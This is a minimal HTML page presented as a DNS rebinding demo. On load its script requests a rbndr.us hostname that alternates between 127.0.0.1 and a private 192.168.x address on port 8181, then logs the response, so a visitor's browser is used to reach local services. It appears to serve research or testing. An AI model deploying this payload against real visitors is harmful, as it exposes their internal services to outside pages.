<html>
<head>
    <title>DNS Rebinding demo</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script type="text/javascript">

        //$(document).ready(rtcDetection);
        
        $.get("http://7f000001.c0a80065.rbndr.us:8181?dummy=" + Math.random(),
                            function(data) {
                            console.log("data", data);
                            debugger;
                        });
    </script>
    <style type="text/css">
        body {
            font-family: Helvetica;
        }
        #container {
            display: none;
        }
        #ip_msg {
            font-weight: bold;
            font-size: 20px;
            color: red;
        }
    </style>
</head>
<body>
    <p id="ip_msg"></p>
    <div id="container"></div>
</body>
</html>